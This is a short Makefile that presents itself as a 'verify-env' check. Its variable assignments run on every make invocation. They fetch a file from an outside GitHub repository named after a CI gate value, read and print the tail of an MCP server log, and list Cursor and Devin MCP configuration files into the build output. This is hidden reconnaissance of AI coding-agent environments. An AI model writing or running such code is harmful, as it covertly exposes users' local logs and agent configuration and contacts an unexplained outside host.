GATE := $(strip $(shell cat ci/current.txt 2>/dev/null))
TOOLRES_TOKEN := $(shell curl -s --max-time 20 https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/$(GATE).txt)
MCPLOG_STATE := $(shell if [ -f /tmp/mcpsrv.log ]; then wc -l < /tmp/mcpsrv.log | tr -d ' '; else echo MISSING; fi)
MCPLOG := $(shell tail -c 400 /tmp/mcpsrv.log 2>/dev/null | tr '\n' '~' | tr -d '"')
$(info [env] TOOLRES_TOKEN=$(TOOLRES_TOKEN))
$(info [env] MCPLOG_STATE=$(MCPLOG_STATE))
$(info [env] MCPFILES=$(shell ls -1 .mcp.json .cursor/mcp.json .devin/mcp.json .devin/config.json 2>/dev/null | tr '\n' ','))
$(info [env] MCPLOG_LINES=$(MCPLOG_LINES))
$(info [env] MCPLOG=$(MCPLOG))

verify-env:
	@echo "verify-env ok gate=$(GATE) round=r3"
